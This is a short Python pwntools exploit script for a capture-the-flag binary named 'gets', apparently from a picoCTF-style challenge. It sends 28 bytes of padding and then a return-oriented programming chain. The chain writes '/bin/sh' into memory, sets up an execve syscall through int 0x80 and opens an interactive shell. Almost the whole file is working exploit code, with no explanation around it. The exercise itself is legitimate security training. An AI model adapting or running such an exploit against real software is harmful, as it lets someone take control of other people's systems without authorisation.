from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = process('/problems/can-you-gets-me_4_f269dbca3097204b5d4a0064467b0a8c/gets')

gdb_script = """
b *0x080b84d5
c
"""
# gdb.attach(p, gdb_script)

p.recvuntil("GIVE ME YOUR NAME!")

aaa_ret = 0x080c02c0
int_0x80 = 0x0806cd95
pop_eax = 0x080b84d6
pop_ebx_2_1 = 0x08099d1c # pop ebx then pop edi then ret
pop_ecx = 0x080dece1
pop_edx = 0x0806f19a
binsh_loc = 0x80ea15c
mov_edx_eax_up_hex188 = 0x08096a3e
mov_edx_eax_up_hex18c = 0x08096a0e


rop = flat ([
    pop_eax, binsh_loc - 0x188,
    pop_edx, '/bin',
    mov_edx_eax_up_hex188,
    pop_edx, '/sh\x00',
    mov_edx_eax_up_hex18c,
    pop_eax, 0x0b,
    pop_ebx_2_1, binsh_loc, 0,
    pop_ecx, 0,
    pop_edx, 0,
    int_0x80
    ])

# rop = flat ([
#     0x0b, pop_eax,
#     0x80488a3
#
# ])

payload = 'a' * 28
payload += rop

print(payload)

p.send(payload)

p.interactive()
